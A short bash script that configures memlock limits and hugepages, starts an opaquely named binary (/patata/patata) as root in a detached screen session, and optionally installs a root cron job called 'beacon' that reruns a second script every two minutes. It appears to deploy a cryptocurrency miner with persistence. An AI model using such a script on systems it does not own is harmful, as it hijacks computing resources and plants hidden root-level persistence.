#!/bin/bash
cd home
sudo rm /etc/cron.d/beacon
if [ ! -f /etc/proof ]; then
    sudo apt-get -y install libmicrohttpd-dev
    sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
    sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
    sudo touch /etc/proof
fi

sudo chmod +x /patata/patata
sudo sed -i "20s/.*/\""$1"\"/" /patata/config.txt
sudo sed -i "18s/.*/\""$2"\"/" /patata/config.txt
sudo sysctl -w vm.nr_hugepages=128
screen -dm sudo /patata/patata /patata/config.txt

if [ $# -eq 3 ]; then
    sudo touch /etc/cron.d/beacon
    cronjob='*/2 * * * *'
    executable='bash /patata/tramboliko.sh'
    echo "${cronjob} root $executable >/dev/null 2>&1" | sudo tee /etc/cron.d/beacon
fi